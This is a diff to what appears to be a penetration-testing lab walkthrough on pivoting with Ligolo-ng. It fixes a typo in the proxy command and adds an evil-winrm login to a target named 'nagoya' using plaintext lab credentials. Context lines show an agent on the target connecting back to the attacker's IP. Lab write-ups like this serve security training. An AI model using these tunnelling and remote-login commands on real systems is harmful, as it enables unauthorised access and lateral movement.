@@ -384,7 +384,7 @@ sudo ip link set ligolo up
 
 🛠 Step 2: Start the Ligolo proxy on your attacker machine:
 ```bash
-sudo ./proxy -selfcertt
+sudo ./proxy -selfcert
 ```
 <img width="1072" height="334" alt="image" src="https://github.com/user-attachments/assets/75ed26d7-e5a9-4f50-befd-04f33797fa57" />
 
@@ -392,6 +392,11 @@ im lab was lagging so i restart the lab and got the new target ip: 192.168.52.21
 
 <img width="778" height="266" alt="image" src="https://github.com/user-attachments/assets/e25a8f80-2597-4da7-a2bf-9ea51a3769c4" />
 
+again i runned after restart the lab
+
+```bash
+evil-winrm -u christopher.lewis -p 'Pass@123' -i nagoya
+```
 
 🛠 Step 3: Run the Ligolo relay (agent) on the target machine:
 
@@ -400,4 +405,5 @@ First, upload the Ligolo-ng agent binary (compiled for Windows) to the target (e
 ```bash
 /agent.exe -connect 192.168.52.21:11601 -ignore-cert
 ```
+
 
